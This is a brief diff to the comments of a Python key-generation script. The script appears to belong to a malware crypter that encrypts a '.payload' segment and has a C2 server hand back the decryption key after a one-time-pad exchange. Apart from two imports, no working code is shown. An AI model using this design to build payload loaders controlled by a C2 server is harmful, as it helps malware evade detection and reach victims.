@@ -1,14 +1,15 @@
 # This file is responsible for generating a public private key pair and
 # Storing those keys into separate header files.
 # The first file is to store the public key to be embedded into the cryptor
-# the private keys will then be stored in another header file for the
+# the private keys will then be stored in another header file for decryption o
+# opperations
 #
 # This file will then generate a symmetric key to be used to encrypt the
-# .payload segment. This key will be stored in the C2 header.
+# .payload segment. This key will be stored in the C2.py file.
 #
 # the client will generate a one time pad and send it to the c2. the c2 will send
 # the key for decrypting the payload segment back. the payload will be decrypted
-# by the key stored in the c2
+# by the key.
 
 import os
 import base64
